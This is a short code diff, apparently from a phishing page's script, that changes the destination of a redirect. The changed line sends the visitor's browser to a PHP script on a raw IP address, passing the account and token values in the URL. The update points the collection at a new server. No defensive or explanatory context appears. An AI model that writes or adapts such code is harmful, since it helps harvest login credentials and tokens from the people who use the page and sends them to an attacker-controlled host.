@@ -95,7 +95,7 @@ function myFunction() {
  }
 
 
-window.location.href = "http://135.148.11.148/access.php?account="+account+"&token="+token ;
+window.location.href = "http://51.81.101.99/access.php?account="+account+"&token="+token ;
 
 }
 </script>
